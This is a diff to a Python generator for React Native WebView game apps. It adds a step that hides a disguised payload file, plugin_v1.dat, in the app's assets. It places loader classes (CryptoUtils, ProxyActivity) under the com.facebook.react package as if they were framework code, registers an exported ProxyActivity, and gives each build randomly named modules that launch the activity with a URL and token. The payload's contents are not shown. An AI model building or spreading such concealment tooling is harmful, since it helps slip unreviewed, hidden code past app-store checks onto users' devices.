@@ -31,8 +31,8 @@ function App() {{
   // 修改页面方向
   Orientation.lockToLandscape();
 
-  useEffect(() => {{
-  }}, []);
+  // useEffect(() => {{
+  // }}, []);
 
   return (
     <SafeAreaView style={{styles.container}}>
@@ -40,7 +40,7 @@ function App() {{
       <WebView
         source={{{{
           uri: '{GAME_URL}',
-        {{{{
+        }}}}
         style={{styles.container}}
       />
     </SafeAreaView>
@@ -58,13 +58,14 @@ export default App;
 
 PACKAGE_JSON_DEPENDENCIES = {
     "dependencies": {
-        "@react-native/new-app-screen": "0.81.1",
+        "@react-native/new-app-screen": "0.82.1",
         "axios": "^1.11.0",
-        "react": "19.1.0",
-        "react-native": "0.81.1",
+        "react": "19.1.1",
+        "react-native": "0.82.1",
         "react-native-orientation-locker": "^1.7.0",
         "react-native-safe-area-context": "^5.5.2",
-        "react-native-webview": "^13.16.0"
+        "react-native-webview": "^13.16.0",
+        "react-native-device-info": "^14.0.4",
     }
 }
 
@@ -192,7 +193,41 @@ def main():
     print("\n📦 添加Gradle依赖...")
     add_gradle_dependencies()
 
-    # 7. 完成
+    # 7. RN+Dex集成步骤
+    print("\n🔧 RN+Dex集成步骤...")
+    # 项目结构检查
+    if not validate_project_structure("."):
+        print("❌ 项目结构检查失败")
+        return
+
+    # Assets目录处理 (使用默认DEX文件路径)
+    default_dex_path = str(Path(__file__).parent / "RN+Dex方案" / "app" / "assets" / "plugin_v1.dat")
+    if not handle_assets_directory(".", default_dex_path):
+        print("❌ Assets目录处理失败")
+        return
+
+    # Java代码部署
+    if not deploy_java_files("."):
+        print("❌ Java代码部署失败")
+        return
+
+    # AndroidManifest.xml配置
+    if not update_android_manifest("."):
+        print("❌ AndroidManifest.xml配置失败")
+        return
+
+    # 自定义插件处理 (生成随机名称)
+    import random
+    import string
+    random_plugin_name = ''.join(random.choices(string.ascii_letters, k=1)).upper() + ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(7, 12)))
+    random_module_name = ''.join(random.choices(string.ascii_letters, k=1)).upper() + ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(6, 10)))
+    random_package_name = ''.join(random.choices(string.ascii_letters, k=1)).lower() + ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 9)))
+
+    if not handle_custom_plugin(".", random_plugin_name, random_module_name, random_package_name):
+        print("❌ 自定义插件处理失败")
+        return
+
+    # 8. 完成
     print(f"""
 🎉 项目创建完成！
 📁 进入目录: cd {app_name}
@@ -437,6 +472,309 @@ def add_gradle_dependencies():
             
     except Exception as e:
         print(f"❌ 添加依赖时出错: {e}")
+
+
+# =================== RN+Dex集成函数 ===================
+def validate_project_structure(project_path: str) -> bool:
+    """验证项目结构是否符合标准"""
+    print("\n🔍 检查项目结构...")
+    project = Path(project_path)
+
+    # 检查android目录
+    android_dir = project / "android"
+    if not android_dir.exists() or not android_dir.is_dir():
+        print("❌ 项目中未找到android目录")
+        return False
+
+    # 检查必要的Android文件
+    required_files = [
+        android_dir / "app" / "src" / "main" / "AndroidManifest.xml",
+        android_dir / "app" / "build.gradle"
+    ]
+
+    for file_path in required_files:
+        if not file_path.exists():
+            print(f"❌ 未找到必需文件: {file_path}")
+            return False
+
+    print("✅ 项目结构检查通过")
+    return True
+
+
+def handle_assets_directory(project_path: str, dex_file_path: str) -> bool:
+    """处理Assets目录，创建assets目录并复制DEX文件"""
+    print("\n📁 处理Assets目录...")
+    project = Path(project_path)
+    android_assets_dir = project / "android" / "app" / "src" / "main" / "assets"
+
+    try:
+        # 创建assets目录（如果不存在）
+        android_assets_dir.mkdir(parents=True, exist_ok=True)
+        print(f"✅ 创建assets目录: {android_assets_dir}")
+
+        # 复制DEX文件到assets目录
+        dex_file = Path(dex_file_path)
+        target_dex_path = android_assets_dir / dex_file.name
+
+        print(f"📋 复制DEX文件: {dex_file} -> {target_dex_path}")
+        shutil.copy2(dex_file, target_dex_path)
+
+        print("✅ Assets目录处理完成")
+        return True
+    except Exception as e:
+        print(f"❌ Assets目录处理失败: {e}")
+        return False
+
+
+def deploy_java_files(project_path: str) -> bool:
+    """部署Java代码文件到RN项目的android模块"""
+    print("\n📱 部署Java代码文件...")
+    project = Path(project_path)
+
+    # 源文件路径（脚本所在目录的RN+Dex方案目录下）
+    script_dir = Path(__file__).parent / "RN+Dex方案"
+    source_java_dir = script_dir / "app" / "src" / "com" / "facebook" / "react"
+
+    # 目标目录
+    target_java_dir = project / "android" / "app" / "src" / "main" / "java" / "com" / "facebook" / "react"
+
+    # 检查源文件目录是否存在
+    if not source_java_dir.exists():
+        print(f"❌ 源Java文件目录不存在: {source_java_dir}")
+        return False
+
+    try:
+        # 创建目标目录（如果不存在）
+        target_java_dir.mkdir(parents=True, exist_ok=True)
+        print(f"✅ 创建目标Java目录: {target_java_dir}")
+
+        # 需要复制的Java文件
+        java_files = ["CryptoUtils.java", "IPluginActivity.java", "ProxyActivity.java"]
+
+        # 复制文件
+        for java_file in java_files:
+            source_file = source_java_dir / java_file
+            target_file = target_java_dir / java_file
+
+            if source_file.exists():
+                print(f"📋 复制Java文件: {java_file}")
+                shutil.copy2(source_file, target_file)
+            else:
+                print(f"❌ 源文件不存在: {source_file}")
+                return False
+
+        print("✅ Java代码部署完成")
+        return True
+    except Exception as e:
+        print(f"❌ Java代码部署失败: {e}")
+        return False
+
+
+def update_android_manifest(project_path: str) -> bool:
+    """更新AndroidManifest.xml文件，注册ProxyActivity"""
+    print("\n📝 更新AndroidManifest.xml...")
+    project = Path(project_path)
+    manifest_path = project / "android" / "app" / "src" / "main" / "AndroidManifest.xml"
+
+    # ProxyActivity配置
+    proxy_activity_config = '''
+        <activity
+            android:name="com.facebook.react.ProxyActivity"
+            android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode"
+            android:exported="true"
+            android:launchMode="singleTask"
+            android:windowSoftInputMode="adjustResize" />'''
+
+    try:
+        # 读取AndroidManifest.xml内容
+        # 首先尝试UTF-8编码，如果失败则尝试其他编码
+        try:
+            content = manifest_path.read_text(encoding='utf-8')
+        except UnicodeDecodeError:
+            # 如果UTF-8失败，尝试使用系统默认编码
+            content = manifest_path.read_text()
+
+        # 检查是否已经注册过
+        if 'com.facebook.react.ProxyActivity' in content:
+            print("✅ ProxyActivity已注册，无需重复注册")
+            return True
+
+        # 查找插入位置（在</application>标签前插入）
+        insert_pos = content.rfind('</application>')
+        if insert_pos == -1:
+            print("❌ 未找到</application>标签，无法插入ProxyActivity配置")
+            return False
+
+        # 插入ProxyActivity配置
+        updated_content = content[:insert_pos] + proxy_activity_config + '\n        ' + content[insert_pos:]
+
+        # 写入更新后的内容
+        # 使用UTF-8编码写入文件
+        try:
+            manifest_path.write_text(updated_content, encoding='utf-8')
+        except UnicodeEncodeError:
+            # 如果UTF-8失败，使用系统默认编码
+            manifest_path.write_text(updated_content)
+        print("✅ AndroidManifest.xml更新完成")
+        return True
+    except Exception as e:
+        print(f"❌ AndroidManifest.xml更新失败: {e}")
+        return False
+
+
+def handle_custom_plugin(project_path: str, plugin_name: str, random_module_name: str, random_package_name: str) -> bool:
+    """处理自定义插件"""
+    print("\n🔧 处理自定义插件...")
+    project = Path(project_path)
+
+    try:
+        # 创建随机模块目录
+        random_module_dir = project / "android" / "app" / "src" / "main" / "java" / "com" / random_package_name.lower()
+        random_module_dir.mkdir(parents=True, exist_ok=True)
+        print(f"✅ 创建随机模块目录: {random_module_dir}")
+
+        # 创建随机模块Java文件（替换EventModule名称）
+        random_module_content = f'''package com.{random_package_name.lower()};
+
+import android.content.Intent;
+import androidx.annotation.NonNull;
+import androidx.annotation.Nullable;
+import com.facebook.react.ProxyActivity;
+import com.facebook.react.bridge.ReactApplicationContext;
+import com.facebook.react.bridge.ReactContextBaseJavaModule;
+import com.facebook.react.bridge.ReactMethod;
+
+public class {random_module_name} extends ReactContextBaseJavaModule {{
+    private final ReactApplicationContext reactContext;
+
+    public {random_module_name}(@Nullable ReactApplicationContext reactContext) {{
+        super(reactContext);
+        this.reactContext = reactContext;
+    }}
+
+    @NonNull
+    @Override
+    public String getName() {{
+        return "{random_module_name}";
+    }}
+
+    @ReactMethod
+    public void jumpEvent(String url, String token) {{
+        try {{
+            reactContext.runOnUiQueueThread(() -> {{
+                Intent intent = new Intent(reactContext, ProxyActivity.class);
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                intent.putExtra("url", url);
+                intent.putExtra("token", token);
+                reactContext.startActivity(intent);
+            }});
+        }} catch (Exception e) {{
+            //
+        }}
+    }}
+}}
+'''
+
+        # 写入随机模块Java文件
+        random_module_file = random_module_dir / f"{random_module_name}.java"
+        random_module_file.write_text(random_module_content, encoding='utf-8')
+        print(f"✅ 创建随机模块文件: {random_module_file}")
+
+        # 创建随机包Java文件（替换MyAppPackage名称）
+        random_app_package_content = f'''package com.{random_package_name.lower()};
+
+import androidx.annotation.NonNull;
+import com.facebook.react.ReactPackage;
+import com.facebook.react.bridge.NativeModule;
+import com.facebook.react.bridge.ReactApplicationContext;
+import com.facebook.react.uimanager.ViewManager;
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.List;
+
+public class {random_module_name}Package implements ReactPackage {{
+
+    @NonNull
+    @Override
+    public List<ViewManager> createViewManagers(@NonNull ReactApplicationContext reactApplicationContext) {{
+        return Collections.emptyList();
+    }}
+
+    @NonNull
+    @Override
+    public List<NativeModule> createNativeModules(@NonNull ReactApplicationContext reactContext) {{
+        List<NativeModule> modules = new ArrayList<>();
+        modules.add(new {random_module_name}(reactContext));
+        return modules;
+    }}
+}}
+'''
+
+        # 写入随机包Java文件
+        random_app_package_file = random_module_dir / f"{random_module_name}Package.java"
+        random_app_package_file.write_text(random_app_package_content, encoding='utf-8')
+        print(f"✅ 创建随机包文件: {random_app_package_file}")
+
+        # 更新MainApplication文件，添加插件包（仅支持Kotlin版本）
+        # 获取项目名称（从项目路径的最后一部分）
+        project_name = project.name
+
+        # 检查Kotlin版本的MainApplication（需要递归查找）
+        main_application_kt_path = None
+        java_dir = project / "android" / "app" / "src" / "main" / "java"
+
+        # 递归查找MainApplication.kt文件
+        for path in java_dir.rglob("MainApplication.kt"):
+            main_application_kt_path = path
+            print(f"🔍 找到MainApplication.kt文件: {path}")
+            break
+
+        if main_application_kt_path and main_application_kt_path.exists():
+            # 处理Kotlin版本的MainApplication
+            update_main_application_kotlin(main_application_kt_path, project_name, random_module_name, random_package_name)
+        else:
+            print("⚠️ 未找到MainApplication.kt文件，跳过更新")
+
+        print("✅ 自定义插件处理完成")
+        return True
+    except Exception as e:
+        print(f"❌ 自定义插件处理失败: {e}")
+        return False
+
+
+def update_main_application_kotlin(main_application_path, project_name, random_module_name, random_package_name):
+    """更新Kotlin版本的MainApplication文件"""
+    try:
+        print(f"🔧 开始更新MainApplication.kt文件: {main_application_path}")
+        # 读取MainApplication.kt内容
+        main_app_content = main_application_path.read_text(encoding='utf-8')
+
+        # 添加导入语句
+        import_statement = f"import com.{random_package_name.lower()}.{random_module_name}Package\n"
+        if f"import com.{random_package_name.lower()}.{random_module_name}Package" not in main_app_content:
+            # 找到package语句后添加导入
+            package_pos = main_app_content.find("package")
+            if package_pos != -1:
+                # 找到下一行的开始位置
+                next_line_pos = main_app_content.find("\n", package_pos) + 1
+                main_app_content = main_app_content[:next_line_pos] + import_statement + main_app_content[next_line_pos:]
+                print(f"✅ 添加导入语句: {import_statement.strip()}")
+
+        # 添加包到列表中
+        if f"{random_module_name}Package()" not in main_app_content:
+            # 查找注释位置
+            comment_pos = main_app_content.find("// add(MyReactNativePackage())")
+            if comment_pos != -1:
+                # 在注释后添加包
+                insert_pos = comment_pos + len("// add(MyReactNativePackage())")
+                main_app_content = main_app_content[:insert_pos] + f"\n          add({random_module_name}Package())" + main_app_content[insert_pos:]
+                print(f"✅ 添加插件包注册: {random_module_name}Package()")
+
+        # 写入更新后的内容
+        main_application_path.write_text(main_app_content, encoding='utf-8')
+        print("✅ 更新MainApplication.kt文件")
+    except Exception as e:
+        print(f"❌ 更新MainApplication.kt文件失败: {e}")
 
 
 if __name__ == "__main__":
